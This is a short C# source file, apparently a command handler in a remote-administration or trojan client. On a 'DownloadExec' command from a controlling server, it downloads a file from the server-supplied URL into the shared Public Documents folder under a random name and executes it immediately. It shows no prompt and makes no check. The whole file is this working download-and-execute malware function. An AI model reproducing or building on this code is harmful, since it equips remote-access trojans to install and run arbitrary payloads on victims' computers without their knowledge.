namespace ConsoleClient.Handle
{
    using MarrySocket.MClient;
    using NetworkObjects;
    using System;
    using System.Diagnostics;
    using System.Linq;
    using System.Net;

    public class HandleDownloadExec : IHandlePacket
    {
        public void Handle(object receivedClass, ServerSocket serverSocket)
        {

            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            var result = new string(
                Enumerable.Repeat(chars, 8)
                          .Select(s => s[random.Next(s.Length)])
                          .ToArray());

            DownloadExec downloadExec = (DownloadExec)receivedClass;
            String url = downloadExec.url;

            String DocumentsPath;
            String endevonurl;
            endevonurl = url.Substring(url.Length - 7);

            DocumentsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\";

            WebClient Client = new WebClient();
            Client.DownloadFile(url, DocumentsPath + result + endevonurl);
            Process.Start(DocumentsPath + result + endevonurl);
        }
    }
}
